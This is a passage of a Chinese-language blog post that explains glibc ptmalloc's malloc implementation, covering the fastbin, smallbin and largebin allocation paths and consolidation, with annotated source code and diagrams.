class="hljs-keyword">if</span> (p != av-&gt;top)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (contiguous (av))<br>            &#123;<br>              assert (((<span class="hljs-type">char</span> *) p) &gt;= min_address);<br>              assert (((<span class="hljs-type">char</span> *) p + sz) &lt;= ((<span class="hljs-type">char</span> *) (av-&gt;top)));<br>            &#125;<br>        &#125;<br>      <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-comment">/* top size is always at least MINSIZE */</span><br>          assert ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (sz) &gt;= MINSIZE);<br>          <span class="hljs-comment">/* top predecessor always marked inuse */</span><br>          assert (prev_inuse (p));<br>        &#125;<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-comment">/* address is outside main heap  */</span><br>      <span class="hljs-keyword">if</span> (contiguous (av) &amp;&amp; av-&gt;top != initial_top (av))<br>        &#123;<br>          assert (((<span class="hljs-type">char</span> *) p) &lt; min_address || ((<span class="hljs-type">char</span> *) p) &gt;= max_address);<br>        &#125;<br>      <span class="hljs-comment">/* chunk is page-aligned */</span><br>      assert (((p-&gt;prev_size + sz) &amp; (GLRO (dl_pagesize) - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>);<br>      <span class="hljs-comment">/* mem is aligned */</span><br>      assert (aligned_OK (chunk2mem (p)));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="do-check-malloced-chunk"><a href="#do-check-malloced-chunk" class="headerlink" title="do_check_malloced_chunk"></a>do_check_malloced_chunk</h3><p>这个检查其实还是调用上面的代码，就是注意除了上面的检查外，它还额外检查了该chunk p的上一个chunk是使用状态的；</p><p>因为这是在smallbin范围内，如果上一个chunk未处于使用状态，并且在该chunk p未分配之前它也是空闲的，会可能发生合并，而不应该出现两个空闲的chunk并存(fast chunk除外)：</p><p>如果上一个chunk 是fast chunk，prev_inuse标志位生效；</p><p>如果上一个chunk是非fast chunk而且非空闲，则prev_inuse生效；如果上一个是空闲chunk则会发生合并，而不会出现两个空闲的chunk并存；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Properties of nonrecycled chunks at the point they are malloced</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">do_check_malloced_chunk</span> <span class="hljs-params">(mstate av, mchunkptr p, INTERNAL_SIZE_T s)</span><br>&#123;<br>  <span class="hljs-comment">/* same as recycled case ... */</span><br>  do_check_remalloced_chunk (av, p, s);<br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">     ... plus,  must obey implementation invariant that prev_inuse is</span><br><span class="hljs-comment">     always true of any allocated chunk; i.e., that each allocated</span><br><span class="hljs-comment">     chunk borders either a previously allocated and still in-use</span><br><span class="hljs-comment">     chunk, or the base of its memory arena. This is ensured</span><br><span class="hljs-comment">     by making all allocations from the `lowest&#x27; part of any found</span><br><span class="hljs-comment">     chunk.  This does not necessarily hold however for chunks</span><br><span class="hljs-comment">     recycled via fastbins.</span><br><span class="hljs-comment">   */</span><br><br>  assert (prev_inuse (p));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="do-check函数之间的调用关系"><a href="#do-check函数之间的调用关系" class="headerlink" title="do_check函数之间的调用关系"></a>do_check函数之间的调用关系</h3><p><img src="/2023/11/26/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826110327985.png"></p><h2 id="malloc的过程"><a href="#malloc的过程" class="headerlink" title="malloc的过程"></a>malloc的过程</h2><p>当我们在C语言中使用malloc函数时会在ptmalloc中调用下面的lib_malloc函数</p><h3 id="lib-malloc"><a href="#lib-malloc" class="headerlink" title="lib_malloc"></a>lib_malloc</h3><p>该函数进行初步的处理，比如获取arena，接着会调用int_malloc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> *<br>__libc_malloc (<span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-type">void</span> *victim;<br><span class="hljs-comment">//1.获取malloc_hook</span><br><span class="hljs-comment">//用来判断是否有hook函数，如果有hook函数就调用，否则向下继续进行</span><br><span class="hljs-comment">//</span><br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br><span class="hljs-comment">//2.获取arena</span><br><span class="hljs-comment">//获取arena后用int_malloc来分配</span><br><span class="hljs-comment">//</span><br>  arena_get (ar_ptr, bytes);<br><br>  victim = _int_malloc (ar_ptr, bytes);<br>  <span class="hljs-comment">/* Retry with another arena only if we were able to find a usable arena</span><br><span class="hljs-comment">     before.  */</span>                                                                                                      <br>  <span class="hljs-comment">//3.换个arena重试</span><br>  <span class="hljs-comment">//如果上一个arena没有分配成功就换一个重试一下</span><br>  <span class="hljs-comment">//</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      LIBC_PROBE (memory_malloc_retry, <span class="hljs-number">1</span>, bytes);<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    (<span class="hljs-type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);<br><br>  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>          ar_ptr == arena_for_chunk (mem2chunk (victim)));<br>  <span class="hljs-keyword">return</span> victim;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="arena-get"><a href="#arena-get" class="headerlink" title="arena_get"></a>arena_get</h4><p>这个宏是用来获取arena的，方便后面用arena来进行内存分配，主要就是上锁</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> arena_get(ptr, size) do &#123; \</span><br><span class="hljs-meta">      ptr = thread_arena;                              \</span><br><span class="hljs-meta">      arena_lock (ptr, size);                              \</span><br><span class="hljs-meta">  &#125; while (0)</span><br></code></pre></td></tr></table></figure><h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="int_malloc"></a>int_malloc</h3><h4 id="定义和一些预操作"><a href="#定义和一些预操作" class="headerlink" title="定义和一些预操作"></a>定义和一些预操作</h4><p>这里主要是一些变量的定义和一些初步操作，比如将用户申请的大小转为chunk的大小，还有就是arena的判断</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br>_int_malloc (mstate av, <span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  INTERNAL_SIZE_T nb;               <span class="hljs-comment">/* normalized request size */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx;                 <span class="hljs-comment">/* associated bin index */</span><br>  mbinptr bin;                      <span class="hljs-comment">/* associated bin */</span><br><br>  mchunkptr victim;                 <span class="hljs-comment">/* inspected/selected chunk */</span><br>  INTERNAL_SIZE_T size;             <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-type">int</span> victim_index;                 <span class="hljs-comment">/* its bin index */</span><br><br>  mchunkptr remainder;              <span class="hljs-comment">/* remainder from a split */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size;     <span class="hljs-comment">/* its size */</span><br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block;               <span class="hljs-comment">/* bit map traverser */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bit;                 <span class="hljs-comment">/* bit map traverser */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">map</span>;                 <span class="hljs-comment">/* current word of binmap */</span><br><br>  mchunkptr fwd;                    <span class="hljs-comment">/* misc temp for linking */</span><br>  mchunkptr bck;                    <span class="hljs-comment">/* misc temp for linking */</span><br><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">     Convert request size to internal form by adding SIZE_SZ bytes</span><br><span class="hljs-comment">     overhead plus possibly more to obtain necessary alignment and/or</span><br><span class="hljs-comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span><br><span class="hljs-comment">     size. Also, checked_request2size traps (returning 0) request sizes</span><br><span class="hljs-comment">     that are so large that they wrap around zero when padded and</span><br><span class="hljs-comment">     aligned.</span><br><span class="hljs-comment">   */</span><br><span class="hljs-comment">//1.将用户申请的大小转为chunk大小</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//</span><br>  checked_request2size (bytes, nb);<br><br>  <span class="hljs-comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span><br><span class="hljs-comment">     mmap.  */</span><br><span class="hljs-comment">//2.如果arena为空，那就调用sysmalloc来分配</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (av == <span class="hljs-literal">NULL</span>))<br>    &#123;<br>      <span class="hljs-type">void</span> *p = sysmalloc (nb, av);<br>      <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>    alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h4><p>根据转换后的chunk的大小依次判断是那种类型的chunk，首先就是fastbin，这里先给出代码和注释部分然后看下分配流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="hljs-comment">   This code is safe to execute even if av is not yet initialized, so we</span><br><span class="hljs-comment">   can try it without checking, which saves some time on this fast path.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast ()))<br>  &#123;<br>    idx = fastbin_index (nb);<span class="hljs-comment">//获取chunk大小对应的fastbin索引</span><br>    <br>    <span class="hljs-comment">//#define fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span><br>    <span class="hljs-comment">//注意这里是个二级指针</span><br>    <span class="hljs-comment">//fb指向对应的fastbin，pp指向fastbin所指向的chunk</span><br>    mfastbinptr *fb = &amp;fastbin (av, idx);<br>    mchunkptr pp = *fb;<br>    <span class="hljs-comment">//catomic_compare_and_exchange_val_acq(a,b,c)意思是如果*a==c,就将 *a = b;否则不变；返回值一直是 *a</span><br>    <span class="hljs-comment">//所以下面是比较 *fb 与 victim，如果相等就 *fb = victim-&gt;fd，相当于移动一个chunk从而空出一个用来分配</span><br>    <span class="hljs-comment">//外层的pp = .. != victim  其实表达的意思一样，相当于又比较一边</span><br>    <span class="hljs-comment">//下面循环的效果就是从fastbin中摘出一个chunk</span><br>    <span class="hljs-keyword">do</span><br>      &#123;<br>        victim = pp;<br>        <span class="hljs-keyword">if</span> (victim == <span class="hljs-literal">NULL</span>)<br>          <span class="hljs-keyword">break</span>;<br>      &#125;<br>    <span class="hljs-keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))<br>           != victim);             <br>    <span class="hljs-comment">//如果victim不为空说明分配了一个chunk</span><br>    <span class="hljs-comment">//下面主要用来检查分配的chunk对应的fastbin索引和最初用来定位该fastchunk的idx是否一致</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>)<br>      &#123;<br>        <span class="hljs-keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="hljs-number">0</span>))<br>          &#123;<br>            errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>          errout:<br>            malloc_printerr (check_action, errstr, chunk2mem (victim), av);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>          &#125;<br>        check_remalloced_chunk (av, victim, nb);<br>        <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>        alloc_perturb (p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>每次从fast bin中分配chunk时，会先获取所申请大小对应fast bin中的索引，然后根据这个索引找到合适的fast bin头部</p><p>每次分配都是先分配其对应fast bin的fd所指向的chunk，我们称为victim，下图为chunk1，分配走后，fast bin的fd指向victim-&gt;fd，下图为chunk2;</p><p><img src="/2023/11/26/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826105607517.png"></p><h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small_bin"></a>small_bin</h4><p>在看这段代码之前，介绍下前面malloc_state的结构体的bins成员。这是一个数组，但是将其抽象成了bin的数组，每个bin由两个单位组成，分别表示fd和bk；</p><p>如下图bin1和bin2，如果将bin2向前移动两个单位，此时bin1和bin2所占的4个单位可以看成一个chunk；</p><p>chunk-&gt;fd和chunk-&gt;bk分别访问的是bin2的fd和bk；</p><p><img src="/2023/11/26/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826111658067.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="hljs-comment">    hold one size each, no searching within bins is necessary.</span><br><span class="hljs-comment">    (For a large request, we need to wait until unsorted chunks are</span><br><span class="hljs-comment">    processed to find best fit. But for small ones, fits are exact</span><br><span class="hljs-comment">    anyway, so we can check now, which is faster.)</span><br><span class="hljs-comment">  */</span><br><br> <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>   &#123;        <br>     <span class="hljs-comment">//1.获取大小对应的smallbin索引，然后获取对应的bin，这里是将对应的bin当成一个chunk用</span><br>     <span class="hljs-comment">//</span><br>     <span class="hljs-comment">//</span><br>     idx = smallbin_index (nb);<br>     bin = bin_at (av, idx);<br><br>     <span class="hljs-comment">//2.last(bin)就是bin-&gt;bk，这里取victim = bin-&gt;bk</span><br>     <span class="hljs-comment">//如果victim != bin 说明此small bin不空</span><br>     <span class="hljs-comment">//</span><br>     <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<br>       &#123;        <br>         <span class="hljs-comment">//3.</span><br>         <span class="hljs-comment">//如果victim == NULL 说明还未初始化</span><br>         <span class="hljs-comment">//</span><br>         <span class="hljs-keyword">if</span> (victim == <span class="hljs-number">0</span>) <span class="hljs-comment">/* initialization check */</span><br>           malloc_consolidate (av);<br>         <span class="hljs-keyword">else</span><br>           &#123;<br>             <span class="hljs-comment">//4.下面就是从smallbin中分配chunk，每次分配是将bin-&gt;bk分配走；</span><br>             <span class="hljs-comment">//下面检查的是victim-&gt;bk-&gt;fd == victim</span><br>             <span class="hljs-comment">//</span><br>             bck = victim-&gt;bk;<br>           <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>               &#123;<br>                 errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                 <span class="hljs-keyword">goto</span> errout;<br>               &#125;<br>             set_inuse_bit_at_offset (victim, nb);<br>             bin-&gt;bk = bck;<br>             bck-&gt;fd = bin;<br><br>             <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>               victim-&gt;size |= NON_MAIN_ARENA;                                                <br>             #下面这一句是仅MALLOCDEBUG模式下有效<br>             check_malloced_chunk (av, victim, nb);<br>             <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>             alloc_perturb (p, bytes);<br>             <span class="hljs-keyword">return</span> p;<br>           &#125;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>每次从small bin中分配chunk，都是分配bin -&gt; bk ，对应下图的chunk1，然后bin -&gt; bk 指向 chunk2，chunk2 -&gt; fd指向bin</p><p><img src="/2023/11/26/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826111749279.png"></p><h4 id="large-bin"><a href="#large-bin" class="headerlink" title="large_bin"></a>large_bin</h4><p>这部分代码比较少，后面会逐步介绍</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment">     If this is a large request, consolidate fastbins before continuing.</span><br><span class="hljs-comment">     While it might look excessive to kill all fastbins before</span><br><span class="hljs-comment">     even seeing if there is space available, this avoids</span><br><span class="hljs-comment">     fragmentation problems normally associated with fastbins.</span><br><span class="hljs-comment">     Also, in practice, programs tend to have runs of either small or</span><br><span class="hljs-comment">     large requests, but less often mixtures, so consolidation is not</span><br><span class="hljs-comment">     invoked all that often in most programs. And the programs that</span><br><span class="hljs-comment">     it is called frequently in otherwise tend to fragment.</span><br><span class="hljs-comment">   */</span><br><br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      idx = largebin_index (nb);<br>      <span class="hljs-keyword">if</span> (have_fastchunks (av))<br>        malloc_consolidate (av);<br>    &#125;<br></code></pre></td></tr></table></figure><h5 id="关于flag"><a href="#关于flag" class="headerlink" title="关于flag"></a>关于flag</h5><p>用malloc_state中的flags标志位来判断fast bin中是否有chunk：</p><p>相关宏定义如下，flags的bit0为0表示fast bin中有fast chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   FASTCHUNKS_BIT held in max_fast indicates that there are probably</span><br><span class="hljs-comment">   some fastbin chunks. It is set true on entering a chunk into any</span><br><span class="hljs-comment">   fastbin, and cleared only in malloc_consolidate.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   The truth value is inverted so that have_fastchunks will be true</span><br><span class="hljs-comment">   upon startup (since statics are zero-filled), simplifying</span><br><span class="hljs-comment">   initialization checks.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FASTCHUNKS_BIT        (1U)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> have_fastchunks(M)     (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> clear_fastchunks(M)    catomic_or (&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_fastchunks(M)      catomic_and (&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span><br></code></pre></td></tr></table></figure><h5 id="关于max-fast"><a href="#关于max-fast" class="headerlink" title="关于max_fast"></a>关于max_fast</h5><p>在malloc_init_state中通过调用set_max_fast宏来初始化fast chunk的最大大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">malloc_init_state</span> <span class="hljs-params">(mstate av)</span><br>&#123;<br>  <span class="hljs-type">int</span> i;<br>  mbinptr bin;<br><br>  <span class="hljs-comment">/* Establish circular links for normal bins */</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; NBINS; ++i)<br>    &#123;<br>      bin = bin_at (av, i);<br>      bin-&gt;fd = bin-&gt;bk = bin;<br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> MORECORE_CONTIGUOUS</span><br>  <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  set_noncontiguous (av);<br>  <span class="hljs-keyword">if</span> (av == &amp;main_arena)<br>    set_max_fast (DEFAULT_MXFAST);<br>  av-&gt;flags |= FASTCHUNKS_BIT;<br><br>  av-&gt;top = initial_top (av);<br>&#125;<br></code></pre></td></tr></table></figure><p>default_maxfast 定义了默认fast chunk的最大大小，比如64位程序中，默认最大大小就是128 即 0x80</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> DEFAULT_MXFAST</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEFAULT_MXFAST     (64 * SIZE_SZ / 4)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_max_fast(s) \</span><br><span class="hljs-meta">  global_max_fast = (((s) == 0)                              \</span><br><span class="hljs-meta">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> get_max_fast() global_max_fast</span><br><br><span class="hljs-type">static</span> INTERNAL_SIZE_T global_max_fast;<br></code></pre></td></tr></table></figure><p>下面是操作global_max_fast的流程，可以通过global_max_fast来判断是否进行初始化</p><p><img src="/2023/11/26/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826113226836.png"></p><h5 id="关于malloc-consolidate"><a href="#关于malloc-consolidate" class="headerlink" title="关于malloc_consolidate"></a>关于malloc_consolidate</h5><p>先给出两个宏定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/* Set size/use field */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_head(p, s)       ((p)-&gt;size = (s))</span><br><br><span class="hljs-comment">/* Set size at footer (only when chunk is not in use) */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;prev_size = (s))</span><br><br></code></pre></td></tr></table></figure><p>下面这段程序主要做的事情有：</p><p>首先遍历fast bins，并且遍历各个fast bin，对其中的每一个fast chunk进行如下操作：</p><p>假定被遍历的fast chunk为p</p><p>1.检查p的前一个chunk是否为空闲，如果为空闲二者进行合并，并且对前一个chunk进行unlink操作，将它从原来的链中取下来；</p><p>2.检查p的后一个chunk：</p><p>-如果是topchunk，则直接和topchunk合并；</p><p>-如果不是topchunk，进一步检查其是否空闲</p><p>–如果空闲则进行合并，并且对后一个chunk进行unlink操作</p><p>–如果非空闲则在后一个chunk中消除p的使用状态位，表示p是空闲的；</p><p>–最后将合并后的chunk放进unsorted bin中，每次放的位置是unsorted bin-&gt;fd的位置，这里如果合并后的chunk在large chunk范围内就将其fd_nextsize和bk_nextsize清空；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 